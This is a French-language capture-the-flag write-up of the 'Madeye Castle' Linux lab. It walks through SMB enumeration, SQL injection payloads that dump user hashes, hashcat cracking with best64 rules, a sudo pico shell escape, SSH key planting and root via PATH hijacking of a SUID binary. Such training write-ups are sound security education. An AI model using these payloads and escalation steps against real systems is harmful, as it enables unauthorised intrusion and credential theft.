# Madeye Castle | Linux

## NMAP | Scan

```bash
nmap -sC -sV -oN -o enum/nmap -vv $ip

PORT    STATE SERVICE     REASON         VERSION
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f5f48fa3d3ee69c239433d18d22b47a (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSmqaAdIPmWjN3e6ubgLXXBGVvX9bKtcNHYD2epO9Fwy4brQNYRBkUxrRp4SJIX26MGxGyE8C5HKzhKdlXCeQS+QF36URayv/joz6UOTFTW3oxsMF6tDYMQy3Zcgh5Xp5yVoNGP84pegTQjXUUxhYSEhb3aCIci8JzPt9JntGuO0d0BQAqEo94K3RCx4/V7AWO1qlUeFF/nUZArwtgHcLFYRJEzonM02wGNHXu1vmSuvm4EF/IQE7UYGmNYlNKqYdaE3EYAThEIiiMrPaE4v21xi1JNNjUIhK9YpTA9kJuYk3bnzpO+u6BLTP2bPCMO4C8742UEc4srW7RmZ3qmoGt
|   256 5375a74aa8aa46666a128ccdc26f39aa (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCDhpuUC3UgAeCvRo0UuEgWfXhisGXTVUnFooDdZzvGRS393O/N6Ywk715TOIAbk+o1oC1rba5Cg7DM4hyNtejk=
|   256 7fc22f3d64d90a507460360398007598 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnNa6K0GzjKiPdClth/sy8rhOd8KtkuagrRkr4tiATl
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

## SMB | Énumération

Je remarque que le port SMB est ouvert, je pourrais peut-être essayer de voir si quelques fichiers peuvent être intéressants.

```bash
smbclient -L //10.10.11.90/                                                                                130 ⨯

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Harry's Important Files
	IPC$            IPC       IPC Service (hogwartz-castle server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            HOGWARTZ-CASTLE
```

```bash

smbclient --no-pass //10.10.11.90/sambashare

Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Nov 26 02:19:20 2020
  ..                                  D        0  Thu Nov 26 01:57:55 2020
  spellnames.txt                      N      874  Thu Nov 26 02:06:32 2020
  .notes.txt                          H      147  Thu Nov 26 02:19:19 2020
```

En récupérant les deux fichiers, spellnames.txt et .notes.txt sur ma machine, le contenu du deuxième fichier nous indique ceci : 

```bash
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```

Peut-être qu’il faudra utiliser la wordlist “rockyou.txt” pour bruteforce une login page ou un hash.

Le contenu de spellnames.txt est le suivant : 

```bash
avadakedavra
crucio
imperio
morsmordre
brackiumemendo
confringo
sectumsempra
sluguluseructo
furnunculus
densaugeo
locomotorwibbly
tarantallegra
serpensortia
levicorpus
flagrate
waddiwasi
duro
alarteascendare
glisseo
locomotormortis
petrificustotalus
liberacorpus
orchideous
avis
descendo
aparecium
obscuro
incarcerous
deprimo
meteolojinxrecanto
oppugno
pointme
deletrius
specialisrevelio
priorincantato
homenumrevelio
erecto
colloportus
alohomora
sonorus
muffliato
relashio
mobiliarbus
mobilicorpus
expulso
reducto
diffindo
defodio
capaciousextremis
piertotumlocomotor
confundo
expectopatronum
quietus
tergeo
riddikulus
langlock
impedimenta
ferula
lumos
nox
impervius
engorgio
salviohexia
obliviate
repellomuggletum
portus
stupefy
rennervate
episkey
silencio
scourgify
reparo
finiteincantatem
protego
expelliarmus
wingardiumleviosa
accio
anapneo
incendio
evanesco
aguamenti
```

Peut-être une liste de passwords ou d’username à réutiliser plus tard. Je garde donc ces deux fichiers de côté.

## PORT 80 | HTTP

![Untitled](https://user-images.githubusercontent.com/68467919/206929098-2378b7a3-f85e-47c6-a2fe-0558aa619f83.png)


Quand nous nous rendons sur le port 80, la page nous indique simplement l’affichage par défaut du serveur Apache.

En regardant le code source, nous pouvons remarquer qu’un commentaire indique le nom de domaine du site.

![Untitled 1](https://user-images.githubusercontent.com/68467919/206929042-bf000831-dc84-43a2-9730-d517ca38e1c4.png)

Nous écrivons donc le nom de domaine dans le fichier /etc/hosts pour pouvoir y accéder.

```bash
echo "$ip hogwartz-castle.thm" | sudo tee -a /etc/hosts
```

## hogwartz-castle.thm | SQL Injection

![Untitled 2](https://user-images.githubusercontent.com/68467919/206929075-59fcf0a7-6267-4499-8fd7-617ef9231198.png)

En essayant une injection SQL dans le champ de connexion, le résultat suivant nous est retourné :

```sql
user='or 1=1 -- -&password=blah
```

```json
{"error":"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"}
```

C’est un bon commencement, nous pourrions donc essayer de dump la base de donnée pour avoir un peu plus d’informations et pourquoi pas retrouver les mots de passes des utilisateurs inscrits sur le site.

```sql
UNION SELECT NULL,NULL,NULL,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' -- -
```

Nous trouvons donc une table “users”, essayons désormais de fouiller dedans et trouver le nom des différentes colonnes.

```json
{"error":"The password for None is incorrect! users"}
```

Ce payload nous permet de trouver le schema de la base de donnée, qui nous retourne différentes colonnes comme name, password, admin et notes.

```sql
'UNION SELECT NULL,NULL,NULL,sql FROM sqlite_master-- -
```

```json
{"error":"The password for None is incorrect! CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null)"}
```

Etant donné que je ne peux pas concat plus de trois colonnes ou même rajouter un séparateur, je suis obligé de faire avec, même si ca n’est pas très lisible. 

```sql
'UNION SELECT group_concat(name,password),NULL,NULL,NULL FROM users -- -
```

Nous obtenons donc plusieurs usernames ainsi que leur password (hashé en SHA512).

```json
{"error":"The password for Lucas Washingtonb326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885Harry Turnere1ed732e4aa925f0bf125ae8ed17dd2d5a1487f9ff97df63523aa481072b0b5ab7e85713c07e37d9f0c6f8b1840390fc713a4350943e7409a8541f15466d8b54Andrea Phillips5628255048e956c9659ed4577ad15b4be4177ce9146e2a51bd6e1983ac3d5c0e451a0372407c1c7f70402c3357fc9509c24f44206987b1a31d43124f09641a8dLiam Hernandez2317e58537e9001429caf47366532d63e4e37ecd363392a80e187771929e302922c4f9d369eda97ab7e798527f7626032c3f0c3fd19e0070168ac2a82c953f7bAdam Jenkins79d9a8bef57568364cc6b4743f8c017c2dfd8fd6d450d9045ad640ab9815f18a69a4d2418a7998b4208d509d8e8e728c654c429095c16583cbf8660b02689905Landon Alexandere3c663d68c647e37c7170a45214caab9ca9a7d77b1a524c3b85cdaeaa68b2b5e740357de2508142bc915d7a16b97012925c221950fb671dd513848e33c33d22eKennedy Andersond3ccca898369a3f4cf73cbfc8daeeb08346edf688dc9b7b859e435fe36021a6845a75e4eddc7a932e38332f66524bd7876c0c613f620b2030ed2f89965823744Sydney Wrightdc2a6b9462945b76f333e075be0bc2a9c87407a3577f43ba347043775a0f4b5c1a78026b420a1bf7da84f275606679e17ddc26bceae25dad65ac79645d2573c0Aaliyah Sanders6535ee9d2b8d6f2438cf92da5a00724bd2539922c83ca19befedbe57859ceafd6d7b9db83bd83c26a1e070725f6f336e21cb40295ee07d87357c34b6774dd918Olivia Murphy93b4f8ce01b44dd25c134d0517a496595b0b081cef6eb625e7eb6662cb12dd69c6437af2ed3a5972be8b05cc14a16f46b5d11f9e27e6550911ed3d0fe656e04dOlivia Ross9a311251255c890692dc84b7d7d66a1eefc5b89804cb74d16ff486927014d97502b2f790fbd7966d19e4fbb03b5eb7565afc9417992fc0c242870ea2fd863d6dGrace Brooks5ed63206a19b036f32851def04e90b8df081071aa8ca9fb35ef71e4daf5e6c6eab3b3fea1b6e50a45a46a7aee86e4327f73a00f48deb8ae2bf752f051563cc8bJordan White87ac9f90f01b4b2ae775a7cb96a8a04d7ab7530282fd76224ee03eecab9114275540e4b6a2c52e890cf11f62aacb965be0c53c48c0e51bf731d046c5c3182aadDiego Baker88344d6b7724bc0e6e3247d4912fa755a5a91c2276e08610462f6ea005d16fd5e305dfe566e7f1dd1a98afe1abfa38df3d9697cdc47ecbb26ac4d21349d09ba7Liam Ward7f67af71e8cbb7188dd187b7da2386cc800ab8b863c9d0b2dce87c98a91b5511330a2ad4f7d73592b50a2a26c26970cfbd22f915d1967cd92569dbf5e24ac77eCarlos Barnes8c8702dbb6de9829bcd6da8a47ab26308e9db7cb274b354e242a9811390462a51345f5101d7f081d36eea4ec199470162775c32cb1f4a96351dc385711619671Carlos Lopezc809b40b7c3c0f095390f3cd96bb13864b7e8fd1670c6b1c05b1e26151be62782b97391b120cb4a8ee1d0c9b8fffaf12b44c9d084ae6041468ad5f12ec3d7a4eOliver Gonzalez68b519187b9e2552d555cb3e9183711b939f94dfe2f71bda0172ee8402acf074cc0f000611d68d2b8e9502fa7235c8a25d72da50916ad0689e00cb4f47283e9bSophie Sanchez7eea93d53fbed3ba8f2fa3d25c5f16fe5eaff1f5371918e0845d2076a2e952a457390ad87d289bf25f9457032f14bb07dcd625d03f2f5ee5c887c09dc7107a66Maya Sanderse49608634f7de91d19e5e1b906e10c5a4a855a4fe32521f310727c9875e823c82b3e0347b32ef49ea44657e60e771d9e326d40ab60ce3a950145f1a7a79d3124Joshua Reedc063c5215b56091327a1f25e38e2d0a5e6db83cceb0ab29cbb0bedd686c18ee5770bfbbfa0a4ac542c8935b0fb63e30ea0bc0408d3523157d840fdfa54ec8dabAaliyah Allen487daab566431e86172ed68f0836f3221592f91c94059a725d2fdca145f97e6258593929c37d0339ca68614a52f4df61953b930585c4968cedaaa836744c52a6Jasmine King44b1fbcbcd576b8fd69bf2118a0c2b82ccf8a6a9ef2ae56e8978e6178e55b61d491f6fc152d07f97ca88c6b7532f25b8cd46279e8a2c915550d9176f19245798Jonathan Longa86fa315ce8ed4d8295bf6d0139f23ba80e918a54a132e214c92c76768f27ce002253834190412e33c9af4ea76befa066d5bdeb47363f228c509b812dc5d81dfSamuel Andersona1f6e38be4bf9fd307efe4fe05522b8c3a9e37fc2c2930507e48cb5582d81f73814ffb543cef77b4b24a18e70e2670668d1a5b6e0b4cb34af9706890bd06bbc9Julian Robinson01529ec5cb2c6b0300ed8f4f3df6b282c1a68c45ff97c33d52007573774014d3f01a293a06b1f0f3eb6e90994cb2a7528d345a266203ef4cd3d9434a3a033ec0Gianna Harrisd17604dbb5c92b99fe38648bbe4e0a0780f2f4155d58e7d6eddd38d6eceb62ae81e5e31a0a2105de30ba5504ea9c75175a79ed23cd18abcef0c8317ba693b953Madelyn Morganac67187c4d7e887cbaccc625209a8f7423cb4ad938ec8f50c0aa5002e02507c03930f02fab7fab971fb3f659a03cd224669b0e1d5b5a9098b2def90082dfdbd2Ella Garcia134d4410417fb1fc4bcd49abf4133b6de691de1ef0a4cdc3895581c6ad19a93737cd63cb8d177db90bd3c16e41ca04c85d778841e1206193edfebd4d6f028cdbZoey Gonzalesafcaf504e02b57f9b904d93ee9c1d2e563d109e1479409d96aa064e8fa1b8ef11c92bae56ddb54972e918e04c942bb3474222f041f80b189aa0efd22f372e802Abigail Morgan6487592ed88c043e36f6ace6c8b6c59c13e0004f9751b0c3fdf796b1965c48607ac3cc4256cc0708e77eca8e2df35b668f5844200334300a17826c033b03fe29Joseph Riveraaf9f594822f37da8ed0de005b940158a0837060d3300be014fe4a12420a09d5ff98883d8502a2aaffd64b05c7b5a39cdeb5c57e3005c3d7e9cadb8bb3ad39ddbElizabeth Cook53e7ea6c54bea76f1d905889fbc732d04fa5d7650497d5a27acc7f754e69768078c246a160a3a16c795ab71d4b565cde8fdfbe034a400841c7d6a37bdf1dab0dParker Cox11f9cd36ed06f0c166ec34ab06ab47f570a4ec3f69af98a3bb145589e4a221d11a09c785d8d3947490ae4cd6f5b5dc4eb730e4faeca2e1cf9990e35d4b136490Savannah Torres9dc90274aef30d1c017a6dc1d5e3c07c8dd6ae964bcfb95cadc0e75ca5927faa4d72eb01836b613916aea2165430fc7592b5abb19b0d0b2476f7082bfa6fb760Aaliyah Williams4c968fc8f5b72fd21b50680dcddea130862c8a43721d8d605723778b836bcbbc0672d20a22874af855e113cba8878672b7e6d4fc8bf9e11bc59d5dd73eb9d10eBlake Washingtond4d5f4384c9034cd2c77a6bee5b17a732f028b2a4c00344c220fc0022a1efc0195018ca054772246a8d505617d2e5ed141401a1f32b804d15389b62496b60f24Claire Miller36e2de7756026a8fc9989ac7b23cc6f3996595598c9696cca772f31a065830511ac3699bdfa1355419e07fd7889a32bf5cf72d6b73c571aac60a6287d0ab8c36Brody Stewart8f45b6396c0d993a8edc2c71c004a91404adc8e226d0ccf600bf2c78d33ca60ef5439ccbb9178da5f9f0cfd66f8404e7ccacbf9bdf32db5dae5dde2933ca60e6Kimberly Murphy is incorrect! None"}
```

Nous récupérons aussi les notes pour voir si quelque chose d’intéressant puisse être récupéré.

```sql
'UNION SELECT group_concat(notes),NULL,NULL,NULL FROM users -- -
```

Tous les autres utilisateurs sauf le numéro 2 a une note (Harry).

```json
{"error":"The password for contact administrator. Congrats on SQL injection... keep digging,My linux username is my first name, and password uses best64, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging,contact administrator. Congrats on SQL injection... keep digging, contact administrator. Congrats on SQL injection... keep digging is incorrect! None"}
```

## Hashcat

La note liée à Harry est la suivante. Son mot de passe utilise une règle best64. Pour faire simple, ce sont des patterns qui sont utilisées qui sont appliquées au mot de passe.

*Plus d’informations ici :* 

[How To Perform A Rule-Based Attack Using Hashcat](https://www.4armed.com/blog/hashcat-rule-based-attack/)

La note de Harry : 

```sql
My linux username is my first name, and password uses best64
```

Voici la commande qui nous permettra de cracker le mot de passe de Harry avec la règle best64.

```bash
hashcat -m 1700 -a 0 b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885 -r /usr/share/hashcat/rules/best64.rule ~/SecLists/Passwords/Leaked-Databases/rockyou.txt

Dictionary cache hit:
* Filename..: /home/b0unce/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 1104517568

b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1700 (SHA2-512)
Hash.Target......: b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd6...c5c885
Time.Started.....: Sun Dec 11 19:56:38 2022 (4 secs)
Time.Estimated...: Sun Dec 11 19:56:42 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/b0unce/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  9518.6 kH/s (6.73ms) @ Accel:256 Loops:77 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 43681792/1104517568 (3.95%)
Rejected.........: 0/43681792 (0.00%)
Restore.Point....: 566272/14344384 (3.95%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: wolframio -> wgiugn
Hardware.Mon.#1..: Util: 92%

Started: Sun Dec 11 19:56:37 2022
Stopped: Sun Dec 11 19:56:44 2022
```

```bash
Résultat : wingardiumleviosa123
```

Comme son nom d’utilisateur est harry et que nous avons son mot de passe, nous pouvons essayer de nous connecter en SSH.

# Flag 1 | Harry

![Untitled 3](https://user-images.githubusercontent.com/68467919/206929175-3deef61c-7658-4b2e-8988-5a24e8c27dc8.png)


En exécutant la commande sudo -l, nous pouvons voir qu’Harry peut exécuter un binaire du nom de pico en tant qu’hermonine.

![Untitled 4](https://user-images.githubusercontent.com/68467919/206929185-01cb5878-45e9-4d7e-b84f-0b4ed586e013.png)

Grâce aux payloads que nous propose le site gtfobins, nous pouvons essayer le dernier, qui nous permettrait de pouvoir spawn le /bin/bash de Hermonine

[pico | GTFOBins](https://gtfobins.github.io/gtfobins/pico/)

```bash
sudo -u hermonine /usr/bin/pico -s /bin/bash
/bin/bash
^T
```

![Untitled 5](https://user-images.githubusercontent.com/68467919/206929200-fa329ade-d2e0-42d6-842c-d7958fcc5538.png)

## Flag 2 | Hermonine

![Untitled 6](https://user-images.githubusercontent.com/68467919/206929221-2f212103-707b-4456-a946-62dd244749dc.png)

Nous pouvons donc ensuite mettre notre clé SSH public dans authorized_keys pour pouvoir nous connecter en SSH en tant qu’Hermonine

![Untitled 7](https://user-images.githubusercontent.com/68467919/206929231-78de74e3-b3d1-4ab8-b318-a1d7f7c04c81.png)


## Flag 3 | Root

```bash
find / -perm -u=s -user root -type f 2>/dev/null

/srv/time-turner/swagger

```

Pour le root, nous voyons qu’un SUID est attribué au fichier swagger. Exécutons donc le script pour voir ce qu’il se passe.

![Untitled 8](https://user-images.githubusercontent.com/68467919/206929337-01cf21a3-4017-4654-a8e2-6d7784458d5b.png)

Il nous demande donc de deviner le nombre qu’il génère aléatoirement à chaque fois que nous re-éxecutons le script.

Pour pouvoir trouver le nombre qu’il génère nous pouvons faire ceci : 

```bash
echo 1 | ./swagger | tr -dc '0-9' | ./swagger
```

En gros, nous allons print le nombre que nous retourne swagger pour lui re-renvoyer directement après.

Rien de bien intéressant, le script nous retourne l’architecture du système.

## Analyse de swagger

![Untitled 9](https://user-images.githubusercontent.com/68467919/206929343-1d9af91d-c14c-4619-a5c6-cec0f6a6b7f4.png)

Nous voyons que le script fait appel au binaire uname pour pouvoir nous ressortir le nom de l’architecture du système. Si nous modifions notre path en y attribuant notre propre “uname”, nous pourrions peut-être obtenir un accès au root.

## Path Hijacking

![Untitled 10](https://user-images.githubusercontent.com/68467919/206929372-3aced21a-bf0d-480c-be9c-21fb41739970.png)

```bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/tmp/:/usr/bin/:/sbin:/bin:/usr/local/games:/usr/games
```

En re-éxcutant la commande, nous obtenons un accès à l’utilisateur root ! 

```bash
echo 1 | ./swagger | tr -dc '0-9' | ./swagger
```

![Untitled 11](https://user-images.githubusercontent.com/68467919/206929381-7733dcca-7ddc-4274-a873-41a99299b707.png)

ROOTED
